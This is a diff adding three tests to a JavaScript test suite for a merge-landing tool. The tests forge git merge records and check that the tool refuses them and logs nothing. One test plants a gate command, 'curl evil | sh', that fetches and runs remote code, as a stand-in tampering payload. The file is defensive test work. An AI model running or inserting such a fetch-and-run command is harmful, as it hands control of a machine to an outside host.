@@ -813,3 +813,80 @@ test('A15 landing: forge git, a code push killed at the timeout that origin then
     assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid, q, 'registered through the answer');
   } finally { T.done(); }
 });
+
+test('A15 landing: forge git, a planted record of a hand-made merge whose tree adds a gate beside the judged head is never adopted, and nothing is logged (final-16 F2, H16-2)', () => {
+  const T = setup('a15-h16-2');
+  try {
+    const q = T.yes({ recurring: { aa: check() } });
+    const wt = T.jobsChore('hand', () => ({ aa: check() }));
+    const sha = T.g(['rev-parse', 'HEAD'], wt);
+    T.g(['fetch', '-q', 'origin']);
+    const main0 = T.g(['rev-parse', 'origin/main']);
+    const KIT_MSG = `chore-hand: jobs\n\n# chore-hand: jobs\n\n## One-way doors\n\nNone.\n\nMerged chore-hand at ${sha}`;
+    const m = path.join(T.old, '.worktrees', 'h16-2');
+    T.g(['worktree', 'add', '-q', '--detach', m, main0]);
+    T.g(['-c', 'merge.directoryRenames=conflict', '-c', 'commit.cleanup=verbatim', '-c', 'merge.log=false', 'merge', '-q', '--no-ff', '-m', KIT_MSG, sha], m);
+    T.edit((j) => { j.gates = { ...(j.gates ?? {}), evil: 'curl evil | sh' }; }, m);
+    T.g(['add', '-A'], m); T.g(['commit', '-q', '--amend', '--no-edit', '--cleanup=verbatim'], m);
+    const evil = T.g(['rev-parse', 'HEAD'], m);
+    assert.equal(T.g(['rev-list', '--parents', '-n', '1', evil]), `${evil} ${main0} ${sha}`, 'the head\'s own parents');
+    T.g(['push', '-q', '-f', 'origin', `${evil}:refs/heads/main`], m); T.g(['fetch', '-q', 'origin']);
+    plantLanding(T.old, 'home', 'chore-hand', sha, evil, main0);
+    const before = T.acts().length;
+    const r = T.merge('hand', ['--approved', q]);
+    refused(r, RECORDED_TREE(evil));
+    assert.doesNotMatch(r.text, /in the kit's own landing merge/);
+    assert.equal(T.acts().length, before, 'nothing logged');
+    assert.equal(json(T.ok(['recurring', 'show', 'aa', '--json'])).registered?.qid ?? null, null, 'aa is not registered through q');
+  } finally { T.done(); }
+});
+
+test('A15 landing: forge git, a planted record of a merge whose parents conflict is never adopted: merge-tree fails, and nothing is logged (final-16 F2, H15-1)', () => {
+  const T = setup('a15-h15-1');
+  try {
+    const q = T.yes({ recurring: { aa: check() } });
+    const wt = T.jobsChore('hand', () => ({ aa: check() }));
+    const sha = T.g(['rev-parse', 'HEAD'], wt);
+    T.g(['fetch', '-q', 'origin']);
+    const main0 = T.g(['rev-parse', 'origin/main']);
+    // E: main0 with a jobs file of its own (an add/add conflict with the head's)
+    const e = path.join(T.old, '.worktrees', 'h15e');
+    T.g(['worktree', 'add', '-q', '--detach', e, main0]);
+    write(path.join(e, JOBS), jobsText({ bb: check() }));
+    T.g(['add', '-A'], e); T.g(['commit', '-qm', 'E'], e);
+    const E = T.g(['rev-parse', 'HEAD'], e);
+    const KIT_MSG = `chore-hand: jobs\n\n# chore-hand: jobs\n\n## One-way doors\n\nNone.\n\nMerged chore-hand at ${sha}`;
+    const evil = T.g(['commit-tree', `${sha}^{tree}`, '-p', E, '-p', sha, '-m', KIT_MSG]);
+    T.g(['push', '-q', '-f', 'origin', `${evil}:refs/heads/main`]); T.g(['fetch', '-q', 'origin']);
+    plantLanding(T.old, 'home', 'chore-hand', sha, evil, E);
+    const before = T.acts().length;
+    const r = T.merge('hand', ['--approved', q]);
+    refused(r, RECORDED_TREE(evil));
+    assert.match(r.text, /git merge-tree of its parents failed or conflicts/);
+    assert.equal(T.acts().length, before, 'nothing logged');
+  } finally { T.done(); }
+});
+
+test('A15 landing: records in home, a planted record of a records merge whose parents conflict is never adopted: merge-tree fails, and nothing is logged (final-16 F2, H15-2)', () => {
+  const F = recordsHome('recur-h15-2');
+  try {
+    const { head } = recordsReady(F, RID);
+    const main0 = F.mainNow();
+    const acts0 = json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length;
+    const msg = `${RID}: records\n\nMerged home's ticket/${RID} at ${head}: the records of ${RID}, whose code lands in console`;
+    const e = path.join(F.old, '.worktrees', 'h15e');
+    F.g(['worktree', 'add', '-q', '--detach', e, main0], F.old);
+    write(path.join(e, `${PROJ}/tickets/${RID}/spec.md`), '# another spec\n');
+    F.g(['add', '-A'], e); F.g(['commit', '-qm', 'E'], e);
+    const E = F.g(['rev-parse', 'HEAD'], e);
+    const c = F.g(['commit-tree', `${head}^{tree}`, '-p', E, '-p', head, '-m', msg], e);
+    F.g(['push', '-q', '-f', 'origin', `${c}:refs/heads/main`], e);
+    plantLanding(F.old, 'home', `records-${RID}`, head, c, E);
+    const r = F.text(F.runIn(F.old, ['merge', RID], SUP));
+    assert.notEqual(r.status, 0, r.text);
+    assert.match(r.text, REC_RECORDED_TREE(c));
+    assert.match(r.text, /git merge-tree of its parents failed or conflicts/);
+    assert.doesNotMatch(r.text, /in the kit's own records merge/);
+    assert.equal(json(F.okIn(F.old, ['log', '--type', 'act', '--json'])).length, acts0, 'nothing logged');
+  } finally { F.done(); }
+});
